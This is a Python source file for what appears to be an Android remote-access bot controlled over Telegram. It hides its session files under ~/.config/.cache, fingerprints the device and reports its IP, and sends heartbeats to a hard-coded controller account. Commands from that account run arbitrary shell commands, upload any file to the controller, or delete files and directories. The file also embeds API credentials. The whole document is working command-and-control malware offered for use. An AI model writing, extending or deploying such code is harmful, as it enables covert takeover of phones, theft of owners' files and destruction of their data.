import asyncio
import os
import subprocess
import sys
import traceback
import random
import string
from telethon import TelegramClient, events

API_ID = 3910389
API_HASH = '86f861352f0ab76a251866059a6adbd6'
SESSION_PATH = os.path.expanduser('~/.config/.cache/client.session')
CONTROLLER_USERNAME = 'mc_abel'
HEARTBEAT_INTERVAL = 60
ID_FILE = os.path.expanduser('~/.config/.cache/device_id.txt')

client = TelegramClient(SESSION_PATH, API_ID, API_HASH)
CONTROLLER_ENTITY = None
DEVICE_ID = "UNKNOWN"
DEVICE_MODEL = "UNKNOWN"

def get_device_info():
    global DEVICE_ID, DEVICE_MODEL
    
    # 1. Read existing ID if valid
    try:
        if os.path.exists(ID_FILE):
            with open(ID_FILE, 'r') as f:
                saved_id = f.read().strip()
                if saved_id and saved_id != "P-err" and saved_id != "UNKNOWN":
                    DEVICE_ID = saved_id
    except Exception:
        pass

    # 2. Generate new ID if needed
    if DEVICE_ID == "UNKNOWN" or DEVICE_ID == "P-err":
        and_id = ""
        try:
            and_id = subprocess.check_output(['/system/bin/settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
        except Exception:
            pass
        
        if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
            try:
                and_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
            except Exception:
                pass
                
        if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
            # Absolute fallback to random 4 characters
            and_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        
        DEVICE_ID = f"P-{and_id[:4]}"
        try:
            with open(ID_FILE, 'w') as f:
                f.write(DEVICE_ID)
        except Exception:
            pass
            
    # 3. Get Model
    try:
        model = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
        if not model:
            model = subprocess.check_output(['getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
        DEVICE_MODEL = model if model and not model.startswith('Exception') else "Unknown"
    except Exception:
        DEVICE_MODEL = "Unknown"

async def resolve_controller():
    global CONTROLLER_ENTITY
    try:
        CONTROLLER_ENTITY = await client.get_entity(CONTROLLER_USERNAME)
    except Exception:
        CONTROLLER_ENTITY = None

async def heartbeat():
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        if CONTROLLER_ENTITY is None:
            await resolve_controller()
        if CONTROLLER_ENTITY:
            try:
                msg = f"🟢 ACTIVE • {DEVICE_ID} • {DEVICE_MODEL}"
                await client.send_message(CONTROLLER_ENTITY, msg)
            except Exception:
                pass

def get_full_details():
    try:
        man = subprocess.check_output(['/system/bin/getprop', 'ro.product.manufacturer'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        mod = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        brand = subprocess.check_output(['/system/bin/getprop', 'ro.product.brand'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        prod = subprocess.check_output(['/system/bin/getprop', 'ro.product.name'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        android = subprocess.check_output(['/system/bin/getprop', 'ro.build.version.release'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        cpu = subprocess.check_output(['/system/bin/getprop', 'ro.product.cpu.abi'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
        
        ip = "127.0.0.1"
        try:
            ip_out = subprocess.check_output(['ip', 'addr', 'show', 'wlan0'], stderr=subprocess.DEVNULL).decode().strip()
            for line in ip_out.split('\n'):
                if 'inet ' in line:
                    ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
                    break
        except Exception:
            pass
                
        return (f"DEVICE DETAILS • {DEVICE_ID}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"Manufacturer: {man}\n"
                f"Model: {mod}\n"
                f"Brand: {brand}\n"
                f"Product: {prod}\n"
                f"Android: {android}\n"
                f"CPU: {cpu}\n"
                f"IP: {ip}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"Status: ACTIVE")
    except Exception as e:
        return f"ERROR gathering details: {e}"

@client.on(events.NewMessage)
async def handler(event):
    if CONTROLLER_ENTITY and event.sender_id == CONTROLLER_ENTITY.id:
        text = event.raw_text.strip()
        
        if not (text.startswith(DEVICE_ID) or text.startswith('*')):
            return
            
        parts = text.split(' ', 1)
        if len(parts) < 2:
            return
            
        cmd_text = parts[1].strip()
        
        if cmd_text == '/dd':
            details = get_full_details()
            await client.send_message(CONTROLLER_ENTITY, details)
            
        elif cmd_text.startswith('EXEC '):
            cmd = cmd_text[5:].strip()
            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                out, _ = proc.communicate()
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OUTPUT:\n{out.decode()}')
            except Exception as e:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')

        elif cmd_text.startswith('PULL '):
            path = cmd_text[5:].strip()
            if os.path.exists(path):
                await client.send_file(CONTROLLER_ENTITY, path)
            else:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {path} not found')

        elif cmd_text.startswith('DELETE '):
            path = cmd_text[7:].strip()
            try:
                if os.path.isdir(path):
                    import shutil
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: deleted {path}')
            except Exception as e:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')

async def main():
    get_device_info()
    await client.start()
    await resolve_controller()
    print(f"[*] Device ID: {DEVICE_ID} | Model: {DEVICE_MODEL}")
    asyncio.create_task(heartbeat())
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        traceback.print_exc()
